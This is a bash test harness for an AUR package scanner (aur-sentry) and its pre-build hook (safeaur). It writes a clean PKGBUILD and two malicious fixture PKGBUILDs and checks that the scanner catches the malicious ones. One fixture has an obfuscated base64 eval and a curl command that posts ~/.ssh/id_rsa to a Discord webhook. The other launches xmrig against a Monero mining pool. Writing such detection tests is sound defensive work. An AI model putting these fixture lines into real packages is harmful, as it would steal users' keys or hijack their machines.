#!/usr/bin/env bash
# scripts/arch_dynamic_audit.sh
# Dynamic testing harness for Arch Linux environment (namcap + aur-sentry + safeaur).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(dirname "$SCRIPT_DIR")"
WORK_DIR="$(mktemp -d /tmp/aur_dynamic_audit_XXXXXX)"

trap 'rm -rf "$WORK_DIR"' EXIT

echo "=== AUR-Sentry Dynamic Arch Linux Verification Suite ==="
echo "Working directory: $WORK_DIR"

# 1. Locate aur-sentry binary
AUR_BIN=""
if [ -x "$REPO_ROOT/target/release/aur-sentry" ] && "$REPO_ROOT/target/release/aur-sentry" --help >/dev/null 2>&1; then
    AUR_BIN="$REPO_ROOT/target/release/aur-sentry"
elif [ -x "$REPO_ROOT/target/debug/aur-sentry" ] && "$REPO_ROOT/target/debug/aur-sentry" --help >/dev/null 2>&1; then
    AUR_BIN="$REPO_ROOT/target/debug/aur-sentry"
elif command -v aur-sentry >/dev/null 2>&1; then
    AUR_BIN="$(command -v aur-sentry)"
fi

if [ -z "$AUR_BIN" ]; then
    echo "Building aur-sentry in container environment..."
    cargo build --release --manifest-path "$REPO_ROOT/Cargo.toml"
    AUR_BIN="$REPO_ROOT/target/release/aur-sentry"
fi
echo "Using binary: $AUR_BIN"

# 2. Test Fixture 1: Clean Benign PKGBUILD
echo ""
echo "--- Dynamic Test 1: Clean Benign Package ---"
mkdir -p "$WORK_DIR/pkg-clean"
cat << 'EOF' > "$WORK_DIR/pkg-clean/PKGBUILD"
# Maintainer: Arch User <user@example.org>
pkgname=clean-tool
pkgver=1.0.0
pkgrel=1
pkgdesc="A standard clean command line utility"
arch=('x86_64')
url="https://example.org/clean-tool"
license=('MIT')
depends=('glibc')
source=("$pkgname-$pkgver.tar.gz::https://example.org/download/v$pkgver.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')

build() {
    cd "$srcdir"
    echo "Compiling clean tool..."
}

package() {
    cd "$srcdir"
    install -Dm755 /dev/null "$pkgdir/usr/bin/clean-tool"
}
EOF

# Run namcap if installed
if command -v namcap >/dev/null 2>&1; then
    echo "Running namcap against clean PKGBUILD..."
    namcap -i "$WORK_DIR/pkg-clean/PKGBUILD" || true
fi

# Run aur-sentry scan-file
echo "Running aur-sentry scan-file..."
if "$AUR_BIN" scan-file "$WORK_DIR/pkg-clean/PKGBUILD"; then
    echo "[PASS] Clean PKGBUILD correctly reported zero findings."
else
    echo "[FAIL] Clean PKGBUILD was falsely flagged!"
    exit 1
fi

# 3. Test Fixture 2: Malicious Obfuscated C2 PKGBUILD
echo ""
echo "--- Dynamic Test 2: Malicious C2 & Obfuscated Package ---"
mkdir -p "$WORK_DIR/pkg-malicious-c2"
cat << 'EOF' > "$WORK_DIR/pkg-malicious-c2/PKGBUILD"
# Maintainer: Bad Actor <evil@example.org>
pkgname=malicious-c2-tool
pkgver=1.0.0
pkgrel=1
pkgdesc="An obfuscated package stealing tokens"
arch=('x86_64')
license=('MIT')
source=("https://example.org/tool.tar.gz")
sha256sums=('SKIP')

build() {
    echo "payload..."
    # Obfuscated eval
    eval "$(echo 'ZWNobyAiZXZpbCI=' | base64 -d)"
    # Discord exfiltration
    curl -X POST -d "token=$(cat ~/.ssh/id_rsa)" https://discord.com/api/webhooks/12345/abcdef
}
EOF

if command -v namcap >/dev/null 2>&1; then
    echo "Running namcap against malicious PKGBUILD..."
    namcap -i "$WORK_DIR/pkg-malicious-c2/PKGBUILD" || true
fi

echo "Running aur-sentry scan-file on malicious package..."
if "$AUR_BIN" scan-file "$WORK_DIR/pkg-malicious-c2/PKGBUILD"; then
    echo "[FAIL] Malicious C2 package was NOT detected!"
    exit 1
else
    echo "[PASS] Malicious C2 package was successfully detected and blocked."
fi

# 4. Test Fixture 3: Cryptojacking PKGBUILD
echo ""
echo "--- Dynamic Test 3: Cryptojacking Package ---"
mkdir -p "$WORK_DIR/pkg-miner"
cat << 'EOF' > "$WORK_DIR/pkg-miner/PKGBUILD"
# Maintainer: Miner Bot <bot@pool.org>
pkgname=hidden-miner-tool
pkgver=0.5.0
pkgrel=1
pkgdesc="Installs background miner"
arch=('x86_64')
license=('GPL')
source=("https://pool.supportxmr.com/miner.tar.gz")
sha256sums=('SKIP')

package() {
    ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u 48edfHuPf1...
}
EOF

echo "Running aur-sentry scan-file on cryptojacking package..."
if "$AUR_BIN" scan-file "$WORK_DIR/pkg-miner/PKGBUILD"; then
    echo "[FAIL] Cryptojacking package was NOT detected!"
    exit 1
else
    echo "[PASS] Cryptojacking package was successfully detected and blocked."
fi

# 5. Dynamic Test 4: safeaur Pre-build Hook Integration
echo ""
echo "--- Dynamic Test 4: safeaur Pre-build Hook Enforcement ---"
SAFEAUR="$REPO_ROOT/bin/safeaur"
export XDG_CACHE_HOME="$WORK_DIR/cache"
mkdir -p "$XDG_CACHE_HOME/safeaur"

# Seed a mock advisory in the cache
cat << 'EOF' > "$XDG_CACHE_HOME/safeaur/advisories.json"
{
  "version": "1.0",
  "updated_at": "2026-03-24T12:00:00Z",
  "total_flagged": 1,
  "advisories": [
    {
      "package": "known-bad-driver",
      "version": "1.0.0",
      "maintainer": "hacked",
      "highest_severity": "CRITICAL",
      "detected_at": "2026-03-24T12:00:00Z",
      "findings": [],
      "aur_url": "https://aur.archlinux.org/packages/known-bad-driver"
    }
  ]
}
EOF

echo "Testing safeaur check on intercepted threat package 'known-bad-driver'..."
set +e
"$SAFEAUR" check "known-bad-driver"
INTERCEPT_EXIT=$?
set -e

if [ "$INTERCEPT_EXIT" -eq 2 ]; then
    echo "[PASS] safeaur successfully aborted with code 2 on intercepted package."
else
    echo "[FAIL] safeaur returned exit code $INTERCEPT_EXIT (expected 2)!"
    exit 1
fi

echo "Testing safeaur scan on clean local PKGBUILD..."
set +e
"$SAFEAUR" scan "$WORK_DIR/pkg-clean/PKGBUILD"
CLEAN_EXIT=$?
set -e

if [ "$CLEAN_EXIT" -eq 0 ]; then
    echo "[PASS] safeaur scan successfully verified clean package."
else
    echo "[FAIL] safeaur scan returned exit code $CLEAN_EXIT (expected 0)!"
    exit 1
fi

echo ""
echo "=========================================================="
echo " [SUCCESS] All Dynamic Arch Linux Checks Passed Cleanly!   "
echo "=========================================================="
